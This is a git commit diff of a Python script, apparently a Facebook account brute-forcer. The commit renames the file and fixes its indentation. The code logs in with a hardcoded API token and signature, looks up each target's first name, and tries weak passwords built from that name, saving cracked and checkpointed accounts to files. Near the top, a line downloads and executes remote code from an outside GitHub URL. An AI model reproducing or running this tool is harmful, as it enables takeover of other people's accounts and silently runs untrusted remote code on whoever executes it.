fed192f57468f42093f1db5c0ce5cea409f4c157
Kitket4 <49296465+Kitket4@users.noreply.github.com>
2019-04-24 07:02:55 +0600

    Update and rename kontol.py to kontol1.py

--- kontol1.py
+++ kontol1.py
@@ -18,11 +18,11 @@ G = '\033[1;32m'
 O = '\033[33m'
 C = '\033[36m'
 
- exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
+exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
 
 
 
- def ngontol():
+def ngontol():
 	if os.path.exists("checkpoint.txt"):
 		if os.path.getsize("checkpoint.txt") !=0:
 			cek=raw_input('%s[!]%s file exists: %scheckpoint.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
@@ -41,8 +41,8 @@ C = '\033[36m'
 			open("multiresult.txt","w").close()
 	else:
 		open("multiresult.txt","w").close()
-
- class autoBrute:
+		
+class autoBrute:
 	def __init__(self):
 		ngontol()
 		self.loop=0
@@ -52,8 +52,8 @@ C = '\033[36m'
 		self.i="https://mbasic.facebook.com/{}"
 		self.a="https://graph.facebook.com/{}"
 		self.gen()
-
- 	def gen(self):
+		
+	def gen(self):
 		self.r=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("[?] email: "),getpass("[?] passs: "))).json()
 		try:
 			self.token=self.r["access_token"]
@@ -67,8 +67,8 @@ C = '\033[36m'
 		p=ThreadPool(input("[?] Enter Threads (int): "))
 		p.map(self.k,self.target)
 		self.panggil()
-
- 	def panggil(self):
+		
+	def panggil(self):
 		if len(self.found) !=0:
 			print("\n\n%s[*]%s found: %s"%(G,N,len(
 				self.found)))
@@ -85,34 +85,32 @@ C = '\033[36m'
 				G,N))
 		if len(self.found) ==0 and len(self.cp) ==0:
 			print("\n%s[:(]%s no result found."%(R,N))
-
- 	def k(self,target):
-		try:
-			self.user=requests.get(self.a.format(
-				target+"?access_token=%s"%(
-			self.token))).json()["first_name"]
-			for x in [self.user+"123",self.user+"12345"]:
-				r=requests.post(self.i.format("login"),
-					data=
-						{
-							"email":target,
-							"pass":x
-						}
-				).url
-				if "save-device" in r or "m_sess" in r:
-					open("multiresult.txt","a").write(
-						"%s|%s\n"%(target,x))
-					self.found.append("%s|%s"%(target,x))
-					break
-				if "checkpoint" in r or "challange" in r:
-					self.cp.append("%s|%s"%(target,x))
-					open("checkpoint.txt","a").write(
-						"%s|%s\n"%(target,x))
-					break
-			self.loop+=1
-			print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
-				len(self.cp),self.loop,len(self.target),
-					G,len(self.found),N)),;sys.stdout.flush()
-		except:pass
-
- autoBrute()
+		
+	def k(self,target):
+		self.user=requests.get(self.a.format(
+			target+"?access_token=%s"%(
+		self.token))).json()["first_name"]
+		for x in [self.user+"123",self.user+"12345"]:
+			r=requests.post(self.i.format("login"),
+				data=
+					{
+						"email":target,
+						"pass":x
+					}
+			).url
+			if "save-device" in r or "m_sess" in r:
+				open("multiresult.txt","a").write(
+					"%s|%s\n"%(target,x))
+				self.found.append("%s|%s"%(target,x))
+				break
+			if "checkpoint" in r or "challange" in r:
+				self.cp.append("%s|%s"%(target,x))
+				open("checkpoint.txt","a").write(
+					"%s|%s\n"%(target,x))
+				break
+		self.loop+=1
+		print("\r[%s] Cracking %s/%s found-:%s%s%s    "%(
+			len(self.cp),self.loop,len(self.target),
+				G,len(self.found),N)),;sys.stdout.flush()
+				
+autoBrute()
